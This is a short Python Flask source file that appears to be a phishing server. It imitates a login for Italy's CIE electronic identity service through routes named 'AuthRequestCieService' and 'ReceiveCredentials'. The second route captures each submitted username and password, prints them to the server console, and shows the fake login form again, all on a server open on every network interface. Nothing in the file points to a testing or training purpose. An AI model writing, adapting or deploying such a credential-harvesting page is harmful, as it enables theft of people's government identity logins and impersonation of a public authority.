from flask import Flask, render_template, request

app = Flask(__name__)

# TODO: translation, footer, background image

@app.route('/')
def home():
    return render_template('landing_page.html')

@app.route('/en')
def home_en():
    return render_template('landing_page_en.html')

@app.route('/AuthRequestCieService', methods=['GET', 'POST'])
def login_cie():
    return render_template("login_cie.html")


@app.route('/ReceiveCredentials', methods=['POST'])
def receive():
    print(request.form.get('username'))
    print(request.form.get('password'))
    return render_template("login_cie.html")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
